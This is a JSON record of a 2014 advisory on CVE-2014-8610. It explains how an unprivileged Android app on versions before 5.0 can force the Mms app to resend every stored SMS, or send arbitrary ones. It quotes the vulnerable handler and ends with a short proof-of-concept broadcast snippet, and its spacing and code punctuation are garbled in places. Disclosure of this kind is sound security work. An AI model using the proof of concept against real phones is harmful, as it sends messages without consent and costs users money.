{
    "text": "title : Android SMS Resend  ， detail : Android versions prior to 5.0 allow an unprivileged application the ability to resend all the SMS's stored in the users phone.  ， cve : advisories | CVE-2014-8610  ，  ， desc : INTRODUCTION  ，  ， In Android <5.0 , an unprivileged app can resend all the SMS stored in the user's phone to their corresponding recipients or senders ( without user interaction ) .  ， No matter whether these SMS are sent to or received from other people. This may leads to undesired cost to user.  ， Even the worse , since Android also allow unprivileged app to create draft SMS , combined with this trick , bad app can send any SMS without privilege requirement.  ， DETAILS  ，  ， This vulnerability exists in the following source file of the Mms app :   ， https : /android.googlesource.com/platform/packages/apps/Mms/+/android-4.4.4_r2.0.1/src/com/android/mms/transaction/SmsReceiverService.java  ， If bad app broadcast an intent with action \"com.android.mms.transaction.MESSAGE_SENT\" , it will reach the method \"handleSmsSent\". If the bad app can also control the resultcode to be RESULT_ERROR_RADIO_OFF , then it will reach the following conditional branch , there the SMS ( determined by uri ) will be moved to a queue to be resent :   ， private void handleSmsSent ( Intent intent , int error ) {  ， .  ， } else if ( mResultCode = SmsManager.RESULT_ERROR_RADIO_OFF )  |  ( mResultCode = SmsManager.RESULT_ERROR_NO_SERVICE ) {  ，  ， Log.v ( TAG , \"handleSmsSent : no service , queuing message w/ uri : \" + uri )  ;   ， }  ， / We got an error with no service or no radio. Register for state changes so  ， / when the status of the connection/radio changes , we can try to send the  ， / queued up messages.  ， registerForServiceStateChanges (  )  ;   ， / We couldn't send the message , put in the queue to retry later.  ， Sms.moveMessageToFolder ( this , uri , Sms.MESSAGE_TYPE_QUEUED , error )  ;   ， .  ， The POC code is as follows :   ， Intent intent= new Intent ( \"com.android.mms.transaction.MESSAGE_SENT\" )  ;   ， intent.setData ( Uri.parse ( \"content : /sms\" )  ;   ， intent.setClassName ( \"com.android.mms\" , \"com.android.mms.transaction.SmsReceiver\" )  ;   ， sendOrderedBroadcast ( intent , null , null , null , SmsManager.RESULT_ERROR_RADIO_OFF , null , null )  ; ",
    "time": "Nov 26, 2014"
}